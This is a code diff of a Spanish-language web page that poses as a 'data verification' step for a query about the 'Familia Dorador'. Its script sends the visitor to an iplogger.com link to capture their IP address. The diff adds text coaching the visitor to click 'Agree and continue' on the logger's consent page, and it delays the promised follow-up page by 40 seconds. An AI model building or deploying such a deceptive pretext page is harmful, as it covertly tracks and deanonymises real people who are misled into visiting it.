@@ -84,6 +84,12 @@
       <h2>Verificación de datos</h2>
       <p>Para continuar, haz clic en el siguiente botón. Serás redirigido a una página de verificación externa.</p>
       <p class="highlight">Consulta asociada a la <u>Familia Dorador</u></p>
+      <p style="color: #444; font-size: 16px; max-width: 480px; margin: auto;">
+  Para continuar con la consulta asociada a la <strong>Familia Dorador</strong>, es necesario confirmar el acceso en la siguiente pantalla.
+  <br><br>
+  Cuando seas redirigido, haz clic en <strong>"Agree and continue"</strong> para finalizar el proceso.
+</p>
+
       <button onclick="redirect()">Aceptar y continuar</button>
     </div>
   </div>
@@ -94,15 +100,19 @@
 
 <script>
   function redirect() {
-    alert('Dale click donde dice "Agree and continue" en la siguiente página.');
+    alert("En la siguiente página, por favor haz clic en el botón 'Agree and continue' para finalizar la validación.");
 
-    // 1. Redirect THIS tab to iplogger
+    // 1. Redirect current tab to iplogger immediately
     window.location.href = "https://iplogger.com/2Uk6c6";
-    
-    // 2. Open the Guanabichi message in a new tab
-    window.open("final.html", "_blank");
+
+    // 2. Delay opening of 'final.html' in a new tab by 40 seconds (40000 ms)
+    setTimeout(() => {
+      window.open("final.html", "_blank");
+    }, 40000);
   }
 </script>
+
+
 
 
 </body>
